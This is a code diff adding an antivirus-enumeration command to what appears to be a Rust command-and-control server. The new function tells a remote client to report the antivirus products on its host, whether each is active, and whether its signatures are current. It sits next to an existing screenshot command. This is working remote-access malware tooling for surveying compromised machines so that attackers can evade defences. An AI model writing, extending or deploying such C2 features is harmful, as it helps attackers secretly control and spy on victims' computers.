@@ -297,3 +297,75 @@ pub fn screenshot(conn: &mut TcpStream, state: &C2State) -> Result<bool, String>
 }
 
 // ---- Screenshot ---------------------------
+
+// ---- Av ---------------------------
+pub fn av(conn: &mut TcpStream) -> Result<bool, String> {
+    let msg = InstructMessage::AntiVirus;
+    match send_message(conn, &msg) {
+        Ok(_) => (),
+        Err(e) => {
+            println!(
+                "\n\t{DIM}[{RESET}{RED}check{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n",
+                e
+            );
+            return Ok(true);
+        }
+    }
+
+    let msg: ClientMessage = match read_message(conn) {
+        Ok(msg) => msg,
+        Err(err) => return Err(err.to_string()),
+    };
+
+    match msg {
+        ClientMessage::AntiVirus(avs) => {
+            println!("\n\t{DIM}[{RESET}{GREEN}antivirus{RESET}{DIM}]{RESET}");
+
+            if avs.is_empty() {
+                println!("\t  No antivirus detected\n");
+            } else {
+                for av in avs {
+                    let active = if av.active {
+                        format!("{GREEN}ON{RESET}")
+                    } else {
+                        format!("{RED}OFF{RESET}")
+                    };
+
+                    let signatures = if av.signatures_up_to_date {
+                        format!("{GREEN}up-to-date{RESET}")
+                    } else {
+                        format!("{YELLOW}outdated{RESET}")
+                    };
+
+                    println!(
+                        "\t  • {}{}{}{}",
+                        CYAN,
+                        av.name,
+                        RESET,
+                        if av.is_default {
+                            format!(" {DIM}(default){RESET}")
+                        } else {
+                            String::new()
+                        }
+                    );
+
+                    println!("\t      State: {}", active);
+                    println!("\t      Signatures: {}", signatures);
+                }
+
+                println!();
+            }
+        },
+        ClientMessage::Error(e) => {
+            println!("\n\t{DIM}[{RESET}{RED}err:av{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n", e);
+            return Err(e)
+        },
+        _ => {
+            println!("\n\t{DIM}[{RESET}{RED}err:av{RESET}{DIM}]{RESET} {YELLOW}Response not recognized{RESET}\n");
+            return Err("unknown response mensage".to_string()); 
+        }
+    };
+
+    Ok(true)
+}
+// ---- Av ---------------------------
